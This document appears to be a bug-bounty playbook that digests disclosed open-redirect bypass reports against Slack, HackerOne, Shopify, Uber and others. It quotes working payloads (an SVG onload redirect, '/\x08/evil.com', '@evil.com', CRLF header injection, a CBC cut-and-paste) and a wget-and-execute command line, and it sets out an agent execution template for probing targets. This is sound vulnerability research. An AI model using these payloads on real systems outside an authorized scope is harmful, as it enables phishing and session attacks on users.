---
title: "Redirect Filter & Validation Bypasses — svg re-breaks, store-id tricks, interstitial skips, CBC cut-paste, Flash 307"
type: playbook
category: redirect-filter-bypasses
cwe: "CWE-601"
source_count: 19
full_bodies_available: 19
corpus: "h1.security.nathan.sx roster (198 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: RDIR-104087 (svg re-break trick, $1,000 json), RDIR-28865 (/../redirect/ filter bypass, $500 json), RDIR-126203 (CBC cut-and-paste, $500 json). Claims trace to bodies read 2026-10-29."
---

# Redirect Filter & Validation Bypasses — breaking the checks other reports created

## 1. Overview

Nineteen cases. Distinctive of this class: **the targets already had protection** — an interstitial
warning page, a signature-gated redirect, a whitelist, a referer check, a store-id allowlist —
and the reports are the bypasses. Two thirds of the money in the corpus's pure-redirect lanes sits
here and in modules 01/03. Six technique families:

| Family | Cases |
|---|---|
| Filter-shape bypasses (signature/interstitial/warning pages) | 28865, 111968, 63158, 67929, 178345 (path half in 02) |
| Platform-trick re-breaks (stored-file redirects) | 104087, 140447 |
| Store-id / checkout_url redirect tricks | 159522, 165046, 175168, 155222 |
| Referer-check logic bugs | 236599 |
| Crypto/encoding of the redirect target | 126203, 145392, 34084 |
| Browser-trust redirects (Flash 307) | 42240, 51265 |
| Whitelist-shape bugs | 44157, 158434, 76738 |

## 2. The anchor — RDIR-104087 (Slack, $1,000 json): re-breaking every fixed redirect

The body's one-line thesis:

> this trick make all fixed open redirect links vulnerable again

Mechanism (verbatim core): the fixed validator only redirects to `https://*.slack.com/...`, so the
reporter hosts the *destination* on Slack itself — an uploaded SVG that redirects:

> 1- use slack account to upload .svg file contain this code
> <code>
> <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
> <svg
>  onload="window.location='http://www.example.com'"
>  xmlns="http://www.w3.org/2000/svg">
> </svg>
> </code>
>
> 2-make public link for svg file "https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=[REDACTED_SECRET]"
>
> 3- complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=[REDACTED_SECRET]"
>
> 4-when user click this link will redirect to "http://www.example.com"

Agent lessons:

1. **Whitelist the origin, lose on content**: any validator that says "same-site destination OK"
   is bypassed by attacker-controlled content *on* that site (uploads, profiles, campaigns).
   Probe the upload→redirect pairing on every same-origin validator.
2. The claim "make all fixed open redirect links vulnerable again" is the strongest impact
   framing in the corpus for a single trick: it re-opens *every* previously-fixed instance at once.
3. 140447 extends the same trick from SVG to full HTML (binary-char content-type confusion) and
   drops a phished login page on `https://slack.com/files-pri/...` — trusted-origin hosting again
   ($500 json).

## 3. Signature/interstitial bypasses (HackerOne)

- **RDIR-28865 ($500 json)** — the link-filter bypass via path normalization:
  > https://hackerone.com/redirect/secure?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com
  > 3. Bypassing 'REDIRECT FILTER' now.
  > https://hackerone.com/../redirect/?signature=...&url=...
  > (Right Click this link and Inspect. You will be shocked to see it bypassed 'REDIRECT FILTER')
  The `/../redirect/` form doesn't match the filter's `/redirect` string check; the server
  normalizes it back. Then combined: `https://hackerone.com/../redirect/secure?signature=...`
- **RDIR-111968 ($500 list)** — the interstitial skipped entirely:
  > I have found a way to use the open redirect vulnerability that zendesk refused to fix and we
  > discussed it in #101146 to bypass intristial redirect. (sic)
  > https://hackerone.com/zendesk_session?locale_id=1&return_to=https://support.hackerone.com/ping/redirect_to_account?state=compayn:/
  Fix framing: "This can be fixed from your end , by detecting the `/ping/redirect_to_account` in
  the `return_to` parameter. (sic)"
- **RDIR-63158 ($500 list)** — markdown renderer vs browser URL-parser divergence:
  > The markdown renderer refuses to render links that start like this, however it can be tricked
  > by using a control character e.g.
  > "[test](/\x08/evil.com)"
- **RDIR-67929** — the warning page itself erroring (hardening row).

## 4. Store-id / checkout_url tricks (Shopify)

- **RDIR-159522 ($500 list)** — attacker store becomes the redirector:
  > 1. Attacker creates a store then adds a new URL redirect with `/[Store_id]` in the **Old path**
  > field and the malicious website(e.g:evil.com) in the **Redirect to** field.
  > 2. `https://<victim>.myshopify.com/account/logout?return_url=https://checkout.shopify.com/[Attacker's_store_id]`
- **RDIR-165046 ($500 list)** — the fix-bypass, day-one shape:
  > `victim.myshopify.com/account/logout?return_url=https://checkout.shopify.com/<victim_store_id>/../14467660`
  > Note that `14467660` is the attacker's store id.
  > The 302 redirect no longer works , but the attacker can still inject any HTML/JavaScript code
  > in his store's 404 page (sic)
  Escalated into the theme editor: `.../admin/themes/<theme_id>/editor#/account/logout?return_url=...`
- **RDIR-155222 ($500 list)** — `@evil.com` authority trick post-fix of 55546:
  > https://ecommerce.shopify.com/accounts?return_to=%40evil.com/
  > Works in all browsers!!
- **RDIR-175168 (low)** — `return_to=/////example.com` (five slashes).

## 5. Logic and crypto of the target value

- **RDIR-236599 (ExpressionEngine, medium)** — referer substring check:
  > The PHP `stristr` function is used to compare the value of the $host variable, which contains
  > the hostname, to the value of the Referer header. The mentioned function returns TRUE iff the
  > second parameter has been found at least once in the first string parameter, so for example if
  > the actual hostname of the ExpressionEngine instance is http://www.example.com and the Referer
  > header's value is http://evil.com?http://www.example.com, comparing the former and the latter
  > would yield a TRUE return value from the `stristr` function, leaving the check flawed.
- **RDIR-126203 (pages.et.uber.com Redirect.aspx, $500 json)** — the redirect target is an
  encrypted blob; the reporter found a **self-encryption oracle** (`?uuid=whatever` page embeds
  its own encrypted URL) and mounted a **CBC cut-and-paste**:
  > so I can decrypt all the cipher by `?EQ=whatever` (remember the padding...)
  > And I can create any cipher by **CBC cut and paste attack**
  > I encrypt `@orange.tw/?` and paste and cipher to bellow URL, when you access URL, you will
  > redirect to orange.tw(my website)
- **RDIR-145392 (Nextcloud)** — PHP header folding + IE:
  > http://nextcloud/index.php?redirect_url=/%3f%0d%0a%09set-cookie:+hello=yoyoo
  > Location: http://nextcloud/?
  > 	set-cookie: hello=yoyoo
  > The problem is that IE is actually not caring at all about that rule from RFC1945 and will
  > strip the tab-character from that header and listen to it
- **RDIR-34084 (t.co, $420 list)** — extended-ascii in 301 → terminal phishing:
  > Imagine a tweet or a line in a tutorial that look like this :
  > `wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh`
  > ...because the script previewed and the one downloaded are different.

## 6. Browser-trust redirects (Flash 307)

- **RDIR-51265 ($2,000 list; CVE-2015-0337)** — FileReference + 307/308:
  > if the target website redirects the user with status code of 307 (or 308), Google Chrome send
  > the same file upload request to the final destination without checking the cross domain
  > policy (second security issue).
- **RDIR-42240 ($1,000 list)** — same 307 family for POST + custom headers:
  > This vulnerability allowed post request with custom headers be sent to any websites(not
  > respecting same origin policy) which chrome was mainly affected.
- Era note: Flash is dead (2020 EOL) — playbook P4 fingerprints these before payload work; they
  are archived doctrine now.

## 7. Agent execution template

```text
P0 — find the protection first: interstitial/warning pages, /redirect?url=+signature,
     whitelists (vimeocdn suffix + .png), referer checks, encrypted targets.
P1 — string-shape bypasses against each:
     1. normalization   /../redirect/, //redirect, /redirect/../notredirect
     2. double-encode   %2F%2F, %252F, ///// (N-slash sweep)
     3. control chars   /\x08/evil.com, %09, %0a
     4. authority       @evil.com, ;@evil.com
     5. suffix-join     .mx/, .np/, .computer TLD (zseano §1 table)
P2 — same-origin content: can you upload SVG/HTML/profile content the validator points to?
P3 — referer checks: substring checks → host anywhere in an attacker referer (stristr shape).
P4 — encrypted targets: find the encryptor (self-embedding pages), test CBC malleability.
P5 — browser-trust: 307/308 POST preservation (historical Flash; modern: verify current stacks).
```

## 8. Validation gates

1. Bypass demonstrated on the **protected** URL (the interstitial/signature/whitelist present),
   not on an unprotected sibling endpoint.
2. String-shape bypasses: show the server's own `Location:` echo or landing proof.
3. Same-origin content tricks: show the stored content + the validator passing it.
4. Fix-bypass rows: link the fixed report id and show both old-blocked and new-working URLs.

## 9. Adjacency

- Path-normalization bypasses (`/../`) are the same server-normalization class as
  `../SQLi`-adjacent WAF bypass lanes.
- CRLF-in-Location (145392) borders `../` request-smuggling/response-splitting doctrine
  (master row 14).
- 236599's stristr bug is the referer-check class cataloged in `../CSRF/05_Validation-Gaps-and-Bypasses.md`.

## 10. Archive-label honesty

- 7 of 19 json-bountied; 158434 and 28865 carry the "(BYPASS)" title prefix convention.
- 67929 is a hardening row (no exploit payload) — kept for the warning-page family census.
- 42240's reporter explicitly cross-files to Google's tracker (code.google.com/p/chromium 332023).

## 11. Cross-references

- Module 01 (the validators these break), `../CSRF/05_Validation-Gaps-and-Bypasses.md`,
  `references/blogs-index.md` §1 for the byte-quoted bypass table.
